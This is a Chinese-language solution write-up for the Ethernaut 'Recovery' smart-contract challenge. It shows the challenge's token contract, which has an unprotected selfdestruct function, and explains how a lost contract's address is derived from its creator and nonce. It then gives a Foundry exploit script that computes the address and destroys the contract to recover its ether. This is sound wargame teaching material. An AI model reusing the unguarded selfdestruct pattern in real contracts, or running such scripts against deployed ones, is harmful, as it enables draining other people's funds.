# Level 17 - Recovery
## 題目
[Recovery](https://ethernaut.openzeppelin.com/level/0xAF98ab8F2e2B24F42C661ed023237f5B7acAB048)

### 通關條件
合約創建者建立了一個非常簡單的代幣工廠合約。任何人都可以輕鬆創建新的代幣。在部署第一個代幣合約後，創建者發送了 0.001 以太幣以獲得更多代幣。他們從此失去了合約地址。
如果您可以從遺失的合約地址中恢復（或刪除）0.001 以太幣，即完成該挑戰。
### 合約內容
``` solidity=
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {
    //generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

contract SimpleToken {
    string public name;
    mapping(address => uint256) public balances;

    // constructor
    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // collect ether in return for tokens
    receive() external payable {
        balances[msg.sender] = msg.value * 10;
    }

    // allow transfers of tokens
    function transfer(address _to, uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount;
    }

    // clean up after ourselves
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}
```
## 解題
題目給了一個創建代幣的工廠合約，並在創建後轉入 0.001 ETH，現在要求你將代幣合約的 0.001 轉回來，但是不知道代幣合約的地址。
看一下代幣的合約 `SimpleToken`，可以轉出的方式有兩種：
1. `transfer(address _to, uint256 _amount)`
2. `function destroy(address payable _to)`  
     關於自毀合約的功能以及特性在 [Level 07 - Force](https://ethernaut.openzeppelin.com/level/0xb6c2Ec883DaAac76D8922519E63f875c2ec65575) 就有考到
     
第 1 種方式只能轉出 `msg.sender` 的代幣，不符合現在的情境。所以只能呼叫合約自毀，為此我們必須找到代幣合約的地址。  
這裡考的是創建合約時的地址生成方式，詳細可以參考以下幾篇，都有清楚的說明：
- [[中文] WTF Solidity极简入门: 24. 在合约中创建新合约](https://github.com/AmazingAng/WTF-Solidity/tree/main/24_Create)
- [[中文] Solidity中通过工厂合约创建合约原理详解](https://learnblockchain.cn/article/8445)

接下來就是計算合約生成地址，address 就是關卡產生的實例地址，nonce 的話則是 1（如果是 EOA 就是從 0 開始計算，合約生成合約是從 1 開始，因為自己生成時 nonce 就已經 +1 了）。  
參數確定後代入地址生成的函數：
  ``` solidity
  address(uint160(uint256(keccak256(RLP_encode(address, nonce)))))
  ```  
  這裡 `RLP_encode()` 在 solidity 中沒有辦法直接呼叫指令計算（應該是有 Library，但我沒有找），我找了別人寫好的 [code](https://stackoverflow.com/a/76195239) 來計算，如果想瞭解 RLP 的計算方式可以參考以下幾篇：
- [Recursive-length prefix (RLP) serialization
](https://ethereum.org/zh-tw/developers/docs/data-structures-and-encoding/rlp/)
- [以太坊的指南针 - RLP编码](https://ethbook.abyteahead.com/ch4/rlp.html)

開始實作攻擊合約
1. 實作 `RLP_encode()`（17-30行）
2. 透過關卡實例地址找到代幣合約地址（8 行）
3. 呼叫代幣合約的自毀功能（12 行）
    
``` solidity=
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/17_Recovery.sol";

contract ExploitScript is Script {
    SimpleToken level17 = SimpleToken(payable(computeContractAddress(your_challenge_address, 1)));

    function run() external {
        vm.startBroadcast();
        level17.destroy(payable(msg.sender));
        vm.stopBroadcast();
    }

    // copy https://stackoverflow.com/a/76195239
    function computeContractAddress(address _origin, uint _nonce) public pure returns (address _address) {
        bytes memory data;
        if(_nonce == 0x00)          data = abi.encodePacked(bytes1(0xd6), bytes1(0x94), _origin, bytes1(0x80));
        else if(_nonce <= 0x7f)     data = abi.encodePacked(bytes1(0xd6), bytes1(0x94), _origin, uint8(_nonce));
        else if(_nonce <= 0xff)     data = abi.encodePacked(bytes1(0xd7), bytes1(0x94), _origin, bytes1(0x81), uint8(_nonce));
        else if(_nonce <= 0xffff)   data = abi.encodePacked(bytes1(0xd8), bytes1(0x94), _origin, bytes1(0x82), uint16(_nonce));
        else if(_nonce <= 0xffffff) data = abi.encodePacked(bytes1(0xd9), bytes1(0x94), _origin, bytes1(0x83), uint24(_nonce));
        else                        data = abi.encodePacked(bytes1(0xda), bytes1(0x94), _origin, bytes1(0x84), uint32(_nonce));
        bytes32 hash = keccak256(data);
        assembly {
            mstore(0, hash)
            _address := mload(0)
        }
    }
}
```
### 另一種找到代幣合約地址的方法
其實除了自己計算合約地址之外，也可以透過 [EtherScan (sepolia)](https://sepolia.etherscan.io) 直接找到，畢竟區塊鏈的特色就是所有行為都會被記錄在鏈上。在 [EtherScan (sepolia)](https://sepolia.etherscan.io) 輸入關卡地址，找到創建合約的那筆交易紀錄並查看接收方的地址，就可以找到代幣合約的地址了  
![Screenshot](https://hackmd.io/_uploads/BkhkmgR2A.png)




